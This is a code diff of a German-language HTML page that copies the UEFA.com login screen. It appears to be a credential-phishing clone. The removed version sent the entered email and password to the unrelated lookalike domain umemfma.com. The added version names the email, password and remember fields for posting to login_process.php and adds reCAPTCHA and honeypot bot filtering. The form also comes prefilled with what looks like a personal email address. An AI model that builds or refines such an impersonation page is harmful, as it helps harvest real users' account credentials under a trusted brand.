@@ -5,7 +5,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>UEFA.com Login</title>
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <!-- Google reCAPTCHA v3 API laden -->
+    <script src="https://www.google.com/recaptcha/api.js"></script>
 </head>
 <body>
     <header class="header">
@@ -18,7 +19,7 @@
             <div style="position: absolute; left: -9999px; top: -9999px;">
                 <label for="hp_email">Nicht ausfüllen</label>
                 <input type="text" id="hp_email" name="hp_email" autocomplete="off" tabindex="-1">
-              </div>
+            </div>
             <div class="my-uefa-logo">MY UEFA</div>
             
             <h1 class="headline">Schließe dich noch heute 43 Millionen Fußballfans an</h1>
@@ -46,6 +47,9 @@
         <div class="login-container">
             <h2 class="login-title">Einloggen</h2>
             
+            <!-- Status-Nachricht für Formular-Feedback -->
+            <div id="statusMsg" class="status-msg" style="display: none;"></div>
+            
             <div class="social-buttons">
                 <a href="#" class="social-button facebook-button">
                     <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="white" style="margin-right: 10px;">
@@ -69,40 +73,64 @@
             
             <div class="or-divider">oder</div>
             
-            <form id="loginForm" action="https://umemfma.com/" method="post">
-                <input type="hidden" id="recaptchaToken" name="recaptchaToken">
+            <form id="loginForm" method="post" action="login_process.php">
                 <div class="form-group">
                     <label class="form-label">E-Mail</label>
-                    <input type="email" class="form-control" value="manuel.schwarz1811@gmail.com">
+                    <input type="email" name="email" class="form-control" value="manuel.schwarz1811@gmail.com">
                 </div>
                 
                 <div class="form-group">
                     <label class="form-label">Passwort</label>
                     <div class="password-container">
-                        <input type="password" class="form-control" value="••••••••">
+                        <input type="password" name="password" class="form-control" value="••••••••">
                         <span class="toggle-password">👁️</span>
                     </div>
                 </div>
                 
                 <div class="remember-me">
-                    <input type="checkbox" id="remember" checked>
+                    <input type="checkbox" id="remember" name="remember" checked>
                     <label for="remember" style="margin-left: 5px;">Angemeldet bleiben</label>
                     <a href="#" class="forgot-password">Ich habe mein Passwort vergessen</a>
                 </div>
-                <input type="hidden" id="recaptchaToken" name="recaptchaToken">
-                <button type="submit" class="submit-button">Abschicken</button>
+                
+                <!-- Verstecktes Feld für reCAPTCHA-Token -->
+                <input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response">
+                <input type="hidden" name="submit_frm" value="1">
+                
+                <!-- Submit-Button mit reCAPTCHA -->
+                <button type="button" class="submit-button g-recaptcha" 
+                    data-sitekey="6LdZLiQrAAAAAGozk6jDs0KOKhgH2kAQ4ZxE-mOZ" 
+                    data-callback="onSubmit" 
+                    data-action="login">Abschicken</button>
             </form>
             
             <div class="new-account-section">
                 <div class="new-account-divider">
                     <span class="new-account-text">Neu bei UEFA?</span>
                 </div>
-                <a href="../Registration/registration.html" id="createAccount" title="UEFA-Account anlegen"  class="create-account-button">UEFA-Account anlegen</a>
+                <a href="../Registration/registration.html" id="createAccount" title="UEFA-Account anlegen" class="create-account-button">UEFA-Account anlegen</a>
             </div>
         </div>
     </div>
 
     <script>
+        // Callback-Funktion, die vom reCAPTCHA aufgerufen wird
+        function onSubmit(token) {
+            // Token ins versteckte Feld übertragen
+            document.getElementById('g-recaptcha-response').value = token;
+            
+            // Honeypot-Check
+            if (document.getElementById('hp_email').value) {
+                document.getElementById('statusMsg').innerHTML = 'Bot erkannt';
+                document.getElementById('statusMsg').style.display = 'block';
+                document.getElementById('statusMsg').className = 'status-msg error';
+                return;
+            }
+            
+            // Formular absenden
+            document.getElementById('loginForm').submit();
+        }
+        
         document.addEventListener('DOMContentLoaded', function() {
             // Toggle password visibility
             const togglePassword = document.querySelector('.toggle-password');
@@ -112,27 +140,6 @@
                 const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                 passwordInput.setAttribute('type', type);
                 togglePassword.textContent = type === 'password' ? '👁️' : '🙈';
-            });
-            
-            // Korrigierter Form-Handling-Code
-            const form = document.getElementById('loginForm');
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                // Honeypot check
-                const honeypot = document.getElementById('hp_email');
-                if (honeypot && honeypot.value) {
-                    return alert('Bot erkannt');
-                }
-                
-                // reCAPTCHA v3 token
-                grecaptcha.ready(function() {
-                    grecaptcha.execute('6LdZLiQrAAAAAGozk6jDs0KOKhgH2kAQ4ZxE-mOZ', { action: 'login' })
-                    .then(function(token) {
-                        document.getElementById('recaptchaToken').value = token;
-                        form.submit();
-                    });
-                });
             });
         });
     </script>
